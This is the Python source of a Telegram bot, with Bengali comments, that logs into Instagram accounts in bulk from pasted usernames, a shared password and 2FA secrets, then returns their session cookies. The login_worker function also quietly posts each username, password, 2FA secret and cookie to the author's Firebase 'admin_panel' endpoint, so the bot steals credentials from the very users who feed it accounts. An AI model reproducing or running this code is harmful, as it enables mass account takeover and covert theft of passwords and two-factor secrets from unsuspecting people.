import telebot, instaloader, time, os, pyotp, sys, requests, uuid, json, threading
from telebot import types
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)

# ================= [ ১. কনফিগারেশন ] =================
FIREBASE_URL = "https://rakib6-3bb46-default-rtdb.asia-southeast1.firebasedatabase.app/"
AUTH_KEY = "RSM12" # অ্যাডমিন প্যানেলের সাথে মিল থাকতে হবে

GROUP_ID = -1003647624840
GROUP_LINK = "https://t.me/+nC_8cVRF3wJiNWY1"

# ================= [ ২. HWID ও লাইসেন্স সিস্টেম ] =================
def get_hwid():
    p = os.path.join(os.path.expanduser("~"), ".santo_auth_id")
    if os.path.exists(p): return open(p, "r").read().strip()
    new_id = str(uuid.uuid4()).replace('-', '').upper()[:12]
    open(p, "w").write(new_id)
    return new_id

DEVICE_ID = get_hwid()

def check_activation():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{Fore.CYAN}======================================")
    print(f"{Fore.YELLOW}       PREMIUM COOKIE BOT       ")
    print(f"{Fore.CYAN}======================================")
    print(f"{Fore.WHITE}🆔 HWID : {Fore.GREEN}{DEVICE_ID}")
    
    try:
        r = requests.get(f"{FIREBASE_URL}users/{DEVICE_ID}.json", timeout=10).json()
        if r and r.get("status") == "active":
            print(f"{Fore.GREEN}🟢 STATUS : ACTIVE (VIP)")
            return r.get("bot_token")
    except: pass
    
    print(f"{Fore.RED}🔴 STATUS : INACTIVE / NOT FOUND")
    print(f"{Fore.YELLOW}Please contact admin to activate your HWID.")
    sys.exit()

BOT_TOKEN = check_activation()
bot = telebot.TeleBot(BOT_TOKEN)
user_sessions = {}

# ================= [ ৩. গ্রুপ জয়েন চেক ] =================
def is_user_joined(user_id):
    try:
        member = bot.get_chat_member(GROUP_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except: return False

# ================= [ ৪. লগইন ও কুকি এক্সট্রাকশন ] =================
def login_worker(chat_id, u, p, k):
    session = user_sessions.get(chat_id)
    if not session: return
    L = instaloader.Instaloader(quiet=True)
    try:
        try:
            L.login(u, p)
        except:
            # 2FA Login attempt
            totp = pyotp.TOTP(k.replace(" ", "")).now()
            L.two_factor_login(totp)
        
        cookies = L.context._session.cookies.get_dict()
        ck_str = "; ".join([f"{n}={v}" for n, v in cookies.items()])
        session['results'].append(f"{u}|{p}|{ck_str}")
        
        # ফায়ারবেস অ্যাডমিন প্যানেলে ডাটা পাঠানো
        db_data = {
            "ig_user": u, "ig_pass": p, "ig_2fa": k, "cookies": ck_str, 
            "hwid": DEVICE_ID, "time": time.strftime("%H:%M:%S"),
            "auth": AUTH_KEY 
        }
        requests.post(f"{FIREBASE_URL}admin_panel.json", json=db_data)
        bot.send_message(chat_id, f"✅ Success: {u}")
        
    except Exception as e:
        session['fail_count'] += 1
        bot.send_message(chat_id, f"❌ Failed: {u}")

def finalize_work(chat_id, executor):
    executor.shutdown(wait=True)
    session = user_sessions.get(chat_id)
    if not session: return
    
    report = f"📊 Work Complete\n✅ Success: {len(session['results'])}\n❌ Failed: {session['fail_count']}"
    
    if session['results']:
        fn = f"Cookies_{chat_id}.txt"
        with open(fn, "w", encoding="utf-8") as f:
            f.write("\n\n".join(session['results']))
        with open(fn, "rb") as d:
            bot.send_document(chat_id, d, caption=report)
        os.remove(fn)
    else:
        bot.send_message(chat_id, report)
    
    user_sessions.pop(chat_id, None)

# ================= [ ৫. বট কমান্ডস ] =================
@bot.message_handler(commands=['start'])
def start(m):
    if not is_user_joined(m.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Our Group", url=GROUP_LINK))
        markup.add(types.InlineKeyboardButton("✅ I have Joined", callback_data="check_join"))
        return bot.send_message(m.chat.id, "⚠️ Access Denied! You must join our group to use this bot.", reply_markup=markup)

    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.row("🚀 Start Bulk")
    bot.send_message(m.chat.id, "Welcome to UN Social Earning Cokies Bot", reply_markup=kb)

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def callback_check(call):
    if is_user_joined(call.from_user.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ You haven't joined yet!", show_alert=True)

@bot.message_handler(func=lambda m: m.text == "🚀 Start Bulk")
def bulk_start(m):
    msg = bot.send_message(m.chat.id, "👤 Enter Usernames (One per line):")
    bot.register_next_step_handler(msg, get_usernames)

def get_usernames(m):
    users = [u.strip() for u in m.text.split('\n') if u.strip()]
    if not users: return bot.send_message(m.chat.id, "❌ List is empty.")
    user_sessions[m.chat.id] = {'u_list': users, 'results': [], 'fail_count': 0}
    msg = bot.send_message(m.chat.id, "🔐 Enter Password (Common for all):")
    bot.register_next_step_handler(msg, get_password)

def get_password(m):
    password = m.text.strip()
    session = user_sessions.get(m.chat.id)
    session['common_pass'] = password
    msg = bot.send_message(m.chat.id, "🔑 Enter 2FA Keys (One per line, sequence must match usernames):")
    bot.register_next_step_handler(msg, start_process)

def start_process(m):
    cid = m.chat.id
    keys = [k.strip() for k in m.text.split('\n') if k.strip()]
    session = user_sessions.get(cid)
    
    if len(keys) != len(session['u_list']):
        return bot.send_message(cid, f"❌ Mismatch! You gave {len(session['u_list'])} users but {len(keys)} keys.")

    bot.send_message(cid, f"🤖 Processing {len(keys)} accounts... Please wait 20 Sec...")
    
    executor = ThreadPoolExecutor(max_workers=10)
    for i in range(len(session['u_list'])):
        executor.submit(login_worker, cid, session['u_list'][i], session['common_pass'], keys[i])
    
    threading.Thread(target=finalize_work, args=(cid, executor)).start()

bot.infinity_polling()
